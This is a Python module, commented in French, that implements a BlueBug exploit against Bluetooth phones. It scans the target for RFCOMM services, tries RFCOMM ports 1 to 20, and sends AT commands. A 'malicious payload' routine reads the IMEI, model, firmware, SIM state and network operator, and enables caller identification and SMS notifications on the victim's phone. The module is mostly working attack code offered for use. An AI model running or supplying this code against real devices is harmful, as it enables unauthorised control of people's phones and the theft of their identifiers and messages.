#!/usr/bin/env python3
"""
Module d'attaque BlueBug - Exploitation de la vulnérabilité BlueBug
"""

import subprocess
import socket
import struct
import time
from typing import Optional, Callable

class BlueBugAttack:
    def __init__(self, config: dict, callback: Optional[Callable] = None):
        self.config = config
        self.callback = callback
        self.running = False
        
    def execute(self, target_address: str, command: str = None) -> bool:
        """Exécuter l'attaque BlueBug"""
        try:
            self.running = True
            self._log("Démarrage de l'attaque BlueBug...", "info")
            
            # Commande par défaut si aucune fournie
            if not command:
                command = self.config.get('default_command', 'AT+CGSN')
                
            # Vérifier la vulnérabilité BlueBug
            if not self._check_bluebug_vulnerability(target_address):
                self._log("Cible non vulnérable au BlueBug", "warning")
                return False
                
            # Exploiter la vulnérabilité
            if self._exploit_bluebug(target_address, command):
                self._log("Exploitation BlueBug réussie!", "success")
                return True
            else:
                self._log("Échec de l'exploitation BlueBug", "error")
                return False
                
        except Exception as e:
            self._log(f"Erreur lors de l'attaque BlueBug: {e}", "error")
            return False
        finally:
            self.running = False
            
    def _check_bluebug_vulnerability(self, target_address: str) -> bool:
        """Vérifier si la cible est vulnérable au BlueBug"""
        try:
            self._log("Vérification de la vulnérabilité BlueBug...", "info")
            
            # Vérifier si l'appareil a un service RFCOMM
            cmd = ['sdptool', 'browse', target_address]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0:
                output = result.stdout.lower()
                
                # Chercher les services RFCOMM
                if 'rfcomm' in output or 'serial' in output:
                    self._log("Service RFCOMM détecté", "info")
                    return True
                else:
                    self._log("Aucun service RFCOMM détecté", "warning")
                    return False
            else:
                self._log("Impossible de parcourir les services", "warning")
                return False
                
        except Exception as e:
            self._log(f"Erreur lors de la vérification: {e}", "error")
            return False
            
    def _exploit_bluebug(self, target_address: str, command: str) -> bool:
        """Exploiter la vulnérabilité BlueBug"""
        try:
            self._log(f"Tentative d'exploitation avec la commande: {command}", "info")
            
            # Essayer différents ports RFCOMM
            rfcomm_ports = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
            
            for port in rfcomm_ports:
                if not self.running:
                    break
                    
                self._log(f"Essai sur le port RFCOMM {port}...", "info")
                
                if self._try_rfcomm_port(target_address, port, command):
                    self._log(f"Exploitation réussie sur le port {port}", "success")
                    return True
                    
            return False
            
        except Exception as e:
            self._log(f"Erreur lors de l'exploitation: {e}", "error")
            return False
            
    def _try_rfcomm_port(self, target_address: str, port: int, command: str) -> bool:
        """Essayer d'exploiter un port RFCOMM spécifique"""
        try:
            # Créer un socket RFCOMM
            sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM)
            sock.settimeout(5)
            
            # Se connecter au port RFCOMM
            sock.connect((target_address, port))
            
            # Envoyer la commande AT
            at_command = f"{command}\r\n".encode('utf-8')
            sock.send(at_command)
            
            # Attendre une réponse
            try:
                response = sock.recv(1024)
                if response:
                    self._log(f"Réponse reçue: {response.decode('utf-8', errors='ignore')}", "info")
                    
                    # Vérifier si la commande a été acceptée
                    if b'OK' in response or b'ERROR' in response:
                        sock.close()
                        return True
                        
            except socket.timeout:
                self._log("Aucune réponse reçue", "warning")
                
            sock.close()
            return False
            
        except socket.error as e:
            self._log(f"Erreur socket sur le port {port}: {e}", "warning")
            return False
        except Exception as e:
            self._log(f"Erreur lors de l'essai du port {port}: {e}", "error")
            return False
            
    def _send_at_command(self, target_address: str, command: str) -> bool:
        """Envoyer une commande AT via RFCOMM"""
        try:
            self._log(f"Envoi de la commande AT: {command}", "info")
            
            # Utiliser rfcomm pour envoyer la commande
            cmd = ['rfcomm', 'connect', target_address, '1']
            process = subprocess.Popen(
                cmd,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            # Envoyer la commande
            input_data = f"{command}\n"
            stdout, stderr = process.communicate(input=input_data, timeout=10)
            
            if process.returncode == 0:
                self._log("Commande AT envoyée avec succès", "success")
                return True
            else:
                self._log(f"Échec de l'envoi de la commande: {stderr}", "warning")
                return False
                
        except subprocess.TimeoutExpired:
            process.kill()
            self._log("Timeout lors de l'envoi de la commande", "warning")
            return False
        except Exception as e:
            self._log(f"Erreur lors de l'envoi de la commande: {e}", "error")
            return False
            
    def _execute_payload(self, target_address: str) -> bool:
        """Exécuter un payload malveillant"""
        try:
            self._log("Exécution du payload malveillant...", "info")
            
            # Payload pour obtenir des informations système
            payload_commands = [
                "AT+CGSN",      # Numéro IMEI
                "AT+CGMI",      # Fabricant
                "AT+CGMM",      # Modèle
                "AT+CGMR",      # Version firmware
                "AT+CPIN?",     # État de la carte SIM
                "AT+COPS?",     # Opérateur réseau
                "AT+CSQ",       # Qualité du signal
                "AT+CLIP=1",    # Activer l'identification de l'appelant
                "AT+CMGF=1",    # Mode texte pour SMS
                "AT+CNMI=2,2,0,0,0"  # Notifications SMS
            ]
            
            success_count = 0
            
            for cmd in payload_commands:
                if not self.running:
                    break
                    
                if self._send_at_command(target_address, cmd):
                    success_count += 1
                    
                time.sleep(1)  # Délai entre les commandes
                
            if success_count > 0:
                self._log(f"Payload exécuté avec succès ({success_count}/{len(payload_commands)} commandes)", "success")
                return True
            else:
                self._log("Aucune commande du payload n'a réussi", "warning")
                return False
                
        except Exception as e:
            self._log(f"Erreur lors de l'exécution du payload: {e}", "error")
            return False
            
    def _log(self, message: str, level: str = "info"):
        """Logger un message"""
        if self.callback:
            self.callback(message, level)
        else:
            print(f"[{level.upper()}] {message}")
            
    def stop(self):
        """Arrêter l'attaque"""
        self.running = False
